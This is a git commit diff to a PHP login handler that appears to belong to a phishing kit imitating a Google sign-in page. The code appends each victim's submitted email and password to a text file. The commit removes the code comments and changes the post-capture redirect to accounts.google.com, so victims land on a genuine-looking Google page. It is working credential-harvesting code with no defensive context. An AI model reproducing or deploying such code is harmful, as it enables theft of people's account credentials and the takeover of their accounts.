83d743a7744e2c1c335faf47f9a4a553f6613f6e
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-07-24 13:49:20 +0500

    Update login.php

--- WebPages/google_standard/login.php
+++ WebPages/google_standard/login.php
@@ -4,16 +4,16 @@ include 'ip.php';
 			
 			$pass = $_POST["password"];
 			$email=$_SESSION["Email"];
-			//opening logins text file for appending new data.
+			
   			$file = fopen("usernames.txt", "a") or die("Unable to open file!");
 			
-  			//Writing email and password to logins.txt. 
+  			 
   			fwrite($file, "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass.PHP_EOL);			
-  			fclose($file);//closing logins.txt.
+  			fclose($file);
 			
-  			//redirecting user to the google drive's locations where the game is available to download.
-  			//change the location url to redirect to a website of your choice.
-  			header("Location: https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view");
+  			
+  			
+  			header("Location: https://accounts.google.com");
 			exit();
 			
 			
